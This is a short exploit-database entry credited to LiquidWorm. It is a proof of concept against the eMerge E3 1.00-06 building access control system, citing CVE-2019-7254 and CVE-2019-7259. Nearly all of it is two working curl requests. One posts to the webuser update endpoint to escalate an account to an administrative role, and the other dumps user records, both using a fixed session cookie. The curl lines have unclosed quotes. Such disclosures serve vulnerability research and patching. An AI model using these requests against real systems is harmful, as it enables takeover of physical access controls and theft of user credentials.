# Exploit Title: eMerge E3 1.00-06 - Privilege Escalation
# Google Dork: NA
# Date: 2018-09-11
# Exploit Author: LiquidWorm
# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
# Software Link: http://linear-solutions.com/nsc_family/e3-series/
# Version: 1.00-06
# Tested on: NA
# CVE : CVE-2019-7254, CVE-2019-7259
# Advisory: https://applied-risk.com/resources/ar-2019-009
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
# Advisory: https://applied-risk.com/resources/ar-2019-005

# PoC
# Escalate:

curl "http://192.168.1.2/?c=webuser&m=update" -X POST –-data "No=3&ID=test&Password=test&Name=test&UserRole=1&Language=en&DefaultPage=sitemap&DefaultFloorNo=1&DefaultFloorState=1&AutoDisconnectTime=24" -H "Cookie: PHPSESSID=d3dda96fc70846b2a7895ffa5ee9aa54; last_floor=1


Disclose:
curl "http://192.168.1.2/?c=webuser&m=select&p=&f=&w=&v=1" -H "Cookie: PHPSESSID=d3dda96fc70846b2a7895ffa5ee9aa54; last_floor=1